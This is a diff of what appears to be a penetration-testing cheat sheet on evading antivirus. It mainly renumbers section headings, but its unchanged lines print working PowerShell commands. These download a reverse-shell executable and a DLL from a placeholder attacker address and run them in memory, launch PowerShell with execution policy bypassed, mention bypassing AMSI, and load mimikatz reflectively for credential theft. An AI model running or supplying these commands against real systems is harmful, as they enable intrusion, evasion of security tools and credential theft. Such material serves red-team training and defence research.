@@ -186,7 +186,7 @@ In addtion, below are some examples of PowerShell commands that allow to manuall
 and PowerShell scripts.
 Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).
 
-Examples - "Manually" Download and execute a .Net PE straight into memory using PowerShell
+2.1.1 Manually download and execute a .Net PE straight into memory using PowerShell
 -------------------------------------------------------------------------------------------
 
 PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/CsharpRevShell.exe')
@@ -201,7 +201,7 @@ PS C:\temp> $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [R
 PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
 
 
-Examples - "Manually" Download and execute a .NET DLL straight into memory using PowerShell
+2.1.2 Manually download and execute a .NET DLL straight into memory using PowerShell
 --------------------------------------------------------------------------------------------
 
 PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
@@ -223,7 +223,7 @@ PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
 PS C:\temp> [System.Reflection.Assembly]::Load($bytes)
 
 
-Example - "Manually"Download and execute a scripts straight into memory using PowerShell
+2.1.3 Manually download and execute a scripts straight into memory using PowerShell
 -----------------------------------------------------------------------------------------
 
 PS C:\temp> powershell -exec bypass
@@ -288,8 +288,8 @@ Mode                 LastWriteTime         Length Name
 -a---         19/09/2022     17:44        1355264 mimikatz.exe
 
 
-Step 3 - Load the Mimikatz 'reflectively' from memory using'Invoke-ReflectivePEInjection-Custom.ps1'
-- - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Step 3 - Load the tool Mimikatz 'reflectively' from memory using'Invoke-ReflectivePEInjection-Custom.ps1'
+- - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 PS C:\temp> 
 PS C:\temp> powershell -version 2
 Windows PowerShell
